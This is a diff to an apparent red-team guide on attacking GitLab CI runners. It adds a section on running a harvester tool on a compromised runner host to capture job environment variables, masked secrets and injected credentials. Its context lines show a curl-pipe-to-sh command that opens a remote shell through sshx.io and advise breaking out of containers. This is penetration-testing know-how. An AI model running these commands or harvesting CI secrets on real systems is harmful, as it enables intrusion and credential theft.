@@ -310,6 +310,16 @@ $ curl -sSf https://sshx.io/get | sh -s run
 
 From the interactive shell, you can now try breakout to the host, or find runner misconfigurations e.g. host mounted volumes.
 
+### Harvesting Runner Node Secrets
+
+If you managed to break out of the container (or its a shell runner) to the underlying host, use [gl-runner-harvester](https://github.com/frjcomp/gl-runner-harvester) to monitor the runner for incoming jobs and dump their context.
+
+```bash
+./gl-runner-harvester
+```
+
+The tool sits on the runner host and intercepts jobs as they are picked up by the runner. For each job it captures the environment variables, cloned source code, and container images. This gives you access to secrets that may never appear in the job logs, such as masked CI/CD variables or credentials injected at runtime.
+
 ## Scanning Container Registries
 
 If the GitLab instance has a container registry enabled, check if you have access to pull container images. These images often contain hardcoded secrets, credentials, or sensitive configuration files that were accidentally included during the build process.
